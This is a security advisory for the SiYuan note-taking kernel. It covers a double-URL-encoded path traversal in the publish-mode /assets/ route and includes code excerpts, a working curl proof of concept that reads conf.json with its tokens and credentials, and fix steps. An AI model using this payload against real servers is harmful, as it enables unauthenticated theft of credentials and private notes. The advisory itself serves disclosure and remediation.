# [H] SiYuan: Path Traversal via Double URL Encoding in /assets/*path (publish mode arbitrary   file─read), Incomplete fix of CVE-2026-41894 

## Summary
Severity: High
Advisory: GHSA-p4m3-mgmm-c664
CVE: CVE-2026-54066
CWE: CWE-1188, CWE-22, CWE-23
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-p4m3-mgmm-c664
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260628153353-2d5d72223df4

## Details
## Summary
  The patch for CVE-2026-41894 ("Path Traversal via Double URL Encoding") sanitized the `/export/` route but the
  **identical root cause remains in the `/assets/*path` route**. In publish mode (anonymous read-only HTTP endpoint,
  default port 6808), an unauthenticated remote attacker can read arbitrary files inside `WorkspaceDir` — including
  `conf/conf.json` (which contains the `AccessAuthCode` SHA256 hash, API token, and sync keys), `temp/siyuan.db`,
  `temp/blocktree.db`, and `siyuan.log` — by double-URL-encoding `..` segments.

  Verified against siyuan v3.6.5:
  - `GET /assets/%252e%252e/%252e%252e/conf/conf.json` → **HTTP 200, 10349 bytes (conf.json served)**
  - `GET /export/%252e%252e/%252e%252e/conf/conf.json` → HTTP 401 (patched)
  - `GET /assets/%2e%2e/conf/conf.json` → HTTP 404 (single-decode handled correctly)

  ## Vulnerable Code

  **Step 1 — route & first decode** (`kernel/server/serve.go:587-626`):
  The router registers `GET /assets/*path` for the publish listener. Gin performs one URL decoding pass on `URL.Path`,
  so a request for `/assets/%252e%252e/...` yields `context.Param("path") == "/%2e%2e/%2e%2e/conf/conf.json"` — literal
  `%2e%2e` strings, which `path.Clean` cannot collapse.

  **Step 2 — second decode via fallback** (`kernel/model/assets.go:536-563`, `GetAssetAbsPath`):
  ```go
  p, err := getAssetAbsPath(relativePath)
  if nil != err {
      // fallback
      decoded, e := url.PathUnescape(relativePath)   // ← line 548, second decode
      if nil == e {
          p, err = getAssetAbsPath(decoded)
      }
  }
  ```
  After the fallback decodes `%2e%2e` to `..`, `filepath.Join(DataDir, "../../conf/conf.json")` is `Clean`-ed to
  `WorkspaceDir/conf/conf.json`, an existing file.

  **Step 3 — publish-mode access gate fall-through** (`kernel/model/publish_access.go:288`,
  `CheckAbsPathAccessableByPublishAccess`):
  ```go
  if !filelock.IsSubPath(util.DataDir, absPath) {
      return true   // ← fall-through allows anything outside DataDir but inside WorkspaceDir
  }
  ```
  Because the resolved file is *outside* `DataDir` (it's in `WorkspaceDir`), the gate returns `true` and
  `IsSensitivePath()` is never invoked — `.db` / `.log` / `conf/` denylists do not apply to the `/assets/` route at all
  (unlike the patched `/export/` route, which additionally checks `IsSubPath(exportBaseDir, ...)`).

  **Step 4 — file served** (`http.ServeFile`): the request `URL.Path` contains literal `%2e%2e`, not `..`, so Go's
  `containsDotDot` guard passes and the file is sent.

  ## PoC

  Preconditions: siyuan kernel running with publish mode enabled (`conf.publish.enable = true`). Publish mode is the
  documented anonymous read-only endpoint for sharing notebooks.

  ```
  $ curl -i "http://victim:6808/assets/%252e%252e/%252e%252e/conf/conf.json"
  HTTP/1.1 200 OK
  Content-Length: 10349
  Content-Type: application/json
  ...
  {"appearance":{...},"editor":{...},"system":{...},"accessAuthCode":"<sha256>","api":{"token":"<api token>"}, ...}
  ```

  Compared with the patched route:
  ```
  $ curl -i "http://victim:6808/export/%252e%252e/%252e%252e/conf/conf.json"
  HTTP/1.1 401 Unauthorized
  ```

  ## Root Cause
  Three independent flaws combine:
  1. `GetAssetAbsPath` performs a second `url.PathUnescape` as a "compatibility" fallback, re-introducing the
  double-decode primitive that the CVE-2026-41894 patch eliminated on `/export/`.
  2. `CheckAbsPathAccessableByPublishAccess` returns `true` for any path outside `DataDir`, even when that path is still
   inside `WorkspaceDir` (which contains `conf/conf.json`, `temp/*.db`, `siyuan.log`).
  3. The `IsSensitivePath()` denylist applied to `/export/` is not called from the `/assets/` handler.

  ## Impact
  Unauthenticated remote arbitrary file read inside `WorkspaceDir`. Confirmed-readable files include:
  - `conf/conf.json` — `accessAuthCode` SHA256 (offline crackable), API token, S3/WebDAV sync credentials.
  - `temp/siyuan.db`, `temp/blocktree.db`, `temp/asset_content.db` — full notebook content (SQLite).
  - `siyuan.log` — internal paths, OS username, plugin info.

  Compromise of `accessAuthCode` / API token escalates to authenticated kernel API access (full read/write of all
  notebooks). Compromise of sync credentials escalates beyond the host.

  ## Fix
  1. Remove the `url.PathUnescape` fallback in `GetAssetAbsPath` (assets.go:548), matching the `/export/` patch.
  2. In `CheckAbsPathAccessableByPublishAccess`, replace the `IsSubPath(DataDir, ...)` fall-through with an explicit
  allowlist (only `DataDir` and its publishable subtree) and **always** call `IsSensitivePath()`.
  3. Apply `IsSensitivePath()` inside the `/assets/*path` handler in `serve.go` as defense-in-depth.

  ## Status
  Privately reported via GitHub Security Advisory. PoC reproduced locally against v3.6.5 (publish port 6808): `GET
  /assets/%252e%252e/%252e%252e/conf/conf.json` returned HTTP 200 / 10349 bytes.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4m3-mgmm-c664
- https://nvd.nist.gov/vuln/detail/CVE-2026-54066
- https://github.com/siyuan-note/siyuan
